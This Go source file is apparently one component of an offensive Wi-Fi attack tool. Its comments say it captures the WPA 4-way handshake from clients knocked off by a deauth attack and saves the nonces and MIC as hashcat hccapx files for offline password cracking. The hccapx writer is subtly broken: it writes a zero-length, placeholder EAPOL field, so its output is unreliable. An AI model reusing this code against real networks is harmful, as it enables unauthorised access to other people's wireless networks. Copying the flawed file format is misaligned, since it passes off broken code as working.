// Package capture — WPA 4-way handshake capture and hccapx writer.
// After deadair deauths a client, it reconnects and performs a WPA handshake.
// This file captures those EAPOL frames and saves them for offline cracking.
package capture

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"sync"
	"time"
)

// HandshakeState tracks progress of the 4-way EAPOL exchange for one client.
type HandshakeState struct {
	BSSID    net.HardwareAddr
	Client   net.HardwareAddr
	SSID     string
	ANonce   [32]byte
	SNonce   [32]byte
	MIC      [16]byte
	Msg1At   time.Time
	Msg2At   time.Time
	Complete bool
}

// HandshakeCapture manages per-client 4-way handshake state machines.
type HandshakeCapture struct {
	mu     sync.Mutex
	states map[string]*HandshakeState // keyed by client MAC
	SSIDFn func(bssid string) string  // lookup SSID from target table
	OutDir string                     // directory to write .hccapx files
}

// NewHandshakeCapture creates a capture manager.
// ssidFn resolves BSSID→SSID; outDir is where .hccapx files are saved.
func NewHandshakeCapture(ssidFn func(string) string, outDir string) *HandshakeCapture {
	_ = os.MkdirAll(outDir, 0755)
	return &HandshakeCapture{
		states: make(map[string]*HandshakeState),
		SSIDFn: ssidFn,
		OutDir: outDir,
	}
}

// ObserveEAPOL processes a raw EAPOL frame payload.
// bssid is the AP, client is the station. Returns SSID if handshake complete.
func (h *HandshakeCapture) ObserveEAPOL(bssid, client net.HardwareAddr, payload []byte) (complete bool, ssid string) {
	if len(payload) < 99 {
		return false, ""
	}

	// EAPOL-Key: type byte at offset 1
	if payload[1] != 3 { // type 3 = EAPOL-Key
		return false, ""
	}

	// Key Info is at bytes 5-6
	keyInfo := binary.BigEndian.Uint16(payload[5:7])
	keyACK := (keyInfo>>7)&1 == 1  // bit 7: Key ACK (AP→Client = msg1/msg3)
	keyMIC := (keyInfo>>8)&1 == 1  // bit 8: Key MIC (Client→AP = msg2/msg4)
	install := (keyInfo>>6)&1 == 1 // bit 6: Install (msg3 from AP)

	key := client.String()
	h.mu.Lock()
	defer h.mu.Unlock()

	state, ok := h.states[key]
	if !ok {
		state = &HandshakeState{
			BSSID:  bssid,
			Client: client,
			SSID:   h.SSIDFn(bssid.String()),
		}
		h.states[key] = state
	}

	// Message 1: AP→client, ACK set, no MIC, no Install
	if keyACK && !keyMIC && !install && state.Msg1At.IsZero() {
		copy(state.ANonce[:], payload[17:49])
		state.Msg1At = time.Now()
		return false, ""
	}

	// Message 2: Client→AP, MIC set, no ACK, no Install
	if !keyACK && keyMIC && !install && !state.Msg1At.IsZero() {
		copy(state.SNonce[:], payload[17:49])
		copy(state.MIC[:], payload[81:97])
		state.Msg2At = time.Now()
		state.Complete = true

		ssid := state.SSID
		if err := h.writeHccapx(state); err != nil {
			fmt.Fprintf(os.Stderr, "[handshake] write error: %v\n", err)
		}
		// Reset for next capture
		delete(h.states, key)
		return true, ssid
	}

	return false, ""
}

// writeHccapx writes a minimal hccapx record (hashcat -m 2500 compatible).
// Format: https://hashcat.net/wiki/doku.php?id=hccapx
func (h *HandshakeCapture) writeHccapx(s *HandshakeState) error {
	filename := fmt.Sprintf("%s/%s_%s.hccapx",
		h.OutDir,
		sanitizeMAC(s.BSSID.String()),
		sanitizeMAC(s.Client.String()))

	f, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer f.Close()

	// hccapx header: magic "HCPX" + version 4
	f.Write([]byte("HCPX"))
	binary.Write(f, binary.LittleEndian, uint32(4))

	// message_pair: 0 = M1+M2
	f.Write([]byte{0x00})

	// essid_len + essid (max 32 bytes)
	essid := []byte(s.SSID)
	if len(essid) > 32 {
		essid = essid[:32]
	}
	f.Write([]byte{byte(len(essid))})
	padded := make([]byte, 32)
	copy(padded, essid)
	f.Write(padded)

	// keyver: 2 = WPA2
	f.Write([]byte{0x02})

	// keymic (16 bytes)
	f.Write(s.MIC[:])

	// mac_ap (6 bytes)
	f.Write([]byte(s.BSSID))
	// nonce_ap (32 bytes)
	f.Write(s.ANonce[:])
	// mac_sta (6 bytes)
	f.Write([]byte(s.Client))
	// nonce_sta (32 bytes)
	f.Write(s.SNonce[:])

	// eapol_len + eapol (placeholder — we don't store full eapol)
	binary.Write(f, binary.LittleEndian, uint16(0))

	return nil
}

func sanitizeMAC(mac string) string {
	out := make([]byte, 0, len(mac))
	for _, c := range []byte(mac) {
		if c != ':' {
			out = append(out, c)
		}
	}
	return string(out)
}
